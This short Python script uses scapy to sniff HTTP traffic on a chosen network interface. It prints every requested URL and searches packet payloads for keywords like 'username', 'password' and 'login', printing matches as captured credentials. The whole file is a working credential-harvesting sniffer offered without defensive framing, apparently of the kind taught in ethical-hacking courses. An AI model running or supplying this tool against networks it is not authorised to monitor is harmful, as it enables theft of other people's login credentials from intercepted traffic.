#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import subprocess
import netifaces

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return "{}{}".format(packet[http.HTTPRequest].Host, packet[http.HTTPRequest].Path)

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        # print(packet)
        load = packet[scapy.Raw].load
        keywords = [
            'username', 'login', 'uname',
            'user', 'password', 'pass',
            'passwd', 'sign', 'name'
        ]

        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url = get_url(packet)
        print("[+] HTTP Request >>> {}".format(url))
        login_info = get_login_info(packet)
        if login_info: 
            print("\n"*2)
            print("="*60)
            print("[+] Possible username/password")
            print(login_info)
            print("="*60)

def get_interfaces():
    i = 0
    interfaces = netifaces.interfaces()
    print("Choose the number of the interface to Sniff:")
    for interface in interfaces:
        print("{}\t\t{}".format(i, interface))
        i = i + 1

    return interfaces


interfaces = get_interfaces()
choice = input("Give me the number: ")
sniff(interfaces[int(choice)])
